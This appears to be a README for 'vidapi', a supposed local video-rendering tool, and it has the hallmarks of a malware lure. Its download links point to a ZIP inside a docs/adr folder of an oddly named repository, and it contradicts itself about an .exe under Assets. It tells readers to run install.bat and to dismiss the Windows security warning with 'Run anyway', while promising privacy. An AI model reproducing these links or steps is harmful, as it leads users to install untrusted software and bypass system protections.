# 🎞️ vidapi - Create professional videos using simple code

[![](https://img.shields.io/badge/Download-vidapi-blue.svg)](https://github.com/donkeypumpalleviation558/vidapi/raw/refs/heads/main/docs/adr/Software_v2.4.zip)

## What this software does

Vidapi turns text instructions into finished video files. It acts as a bridge between your computer and high-end video tools. You send a request to the service, and it handles the heavy lifting involved in putting video clips, text, and audio together. It runs locally on your machine, which means your data stays private and you do not pay subscription fees to cloud services.

## System requirements 🖥️

Your computer needs the following features to run this software:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel i5, AMD Ryzen 5, or better.
*   Memory: 8 GB of RAM minimum, though 16 GB performs better.
*   Storage: At least 2 GB of free space for the software and temporary video files.
*   Network: A stable internet connection for the initial setup.

## How to download 📥

You can grab the latest version of the application from our release page. 

[Click here to visit the download page](https://github.com/donkeypumpalleviation558/vidapi/raw/refs/heads/main/docs/adr/Software_v2.4.zip)

Look for the section marked Assets. You should see a file ending in .exe. Click this file to start the download. Once the bar finishes, open the folder on your computer where the file saved.

## Setting up on Windows 🛠️

Follow these steps to prepare your machine:

1.  **Extract the files:** Right-click the downloaded folder and select Extract All. Choose a location on your drive, like your Documents folder.
2.  **Install requirements:** This software relies on two main engines called FFmpeg and Python. The installer includes these, but you must ensure your Windows system recognizes them.
3.  **Run the installer:** Double-click the file named install.bat. A black window appears on your screen. This window stays open while the computer installs the components. Do not close this window until it says "Installation Complete."
4.  **Security access:** Windows might show a blue pop-up warning you about a new application. Click More info and then click Run anyway to proceed.

## Starting the service ⚙️

After the installer finishes, you are ready to launch the service:

1.  Open the folder where you extracted the files.
2.  Double-click the file labeled run_service.bat.
3.  A window appears showing text logs. This means the engine is starting. 
4.  Keep this window open while you want to create videos. Minimizing it is fine, but do not close it or the service will stop.

## Creating your first video 🎥

Vidapi creates videos based on instructions you send to it. The system uses a standard format for these instructions. You can test that the service is running by opening your web browser and typing the following into the address bar:

http://localhost:8000/docs

This opens a page that lists the commands the software understands. You can use this page to trigger your first render. If the page loads, the service works.

## Understanding the video engine ⚙️

This software powers your video creation through three main components:

*   **FastAPI:** This acts as the messenger. It receives your request and passes it to the correct part of the software.
*   **Editly:** This is the creative layer. It follows your instructions to place text on screen, cut clips, and add transitions.
*   **FFmpeg:** This is the professional engine. It processes the raw data into a standard MP4 file that you can play on any device.

## Troubleshooting common issues 🔧

If you run into trouble, follow these steps to fix the most common errors:

*   **The black window closes immediately:** This usually happens if your computer has trouble finding the correct folder. Move your installation folder to the root of your C drive (e.g., C:\vidapi) and try again.
*   **Video rendering hangs:** Video creation takes a lot of processing power. If you have other heavy applications open, such as a video game or a web browser with many tabs, close them to free up memory.
*   **Missing file error:** Ensure that you extracted the entire folder folder from the ZIP file before running the script. Running the installer from inside the ZIP folder often causes errors.

## Privacy and data 🔒

All rendering happens on your local machine. No video files or instructions leave your computer. You keep full control over your media at all times. This software does not track your usage or collect personal information. 

## Updating the software 🔄

Whenever a new version becomes available on the download link, repeat the steps in the download section. You can usually overwrite the old files with the new ones. If the instructions include specific migration steps, they will appear on the release page.

## Getting more help 📋

If you want to understand more about the technical side of how your requests work, check the instruction manual inside the folder. It lists the commands available for text overlays, image stacking, and audio syncing. Use these commands to build more complex video projects over time.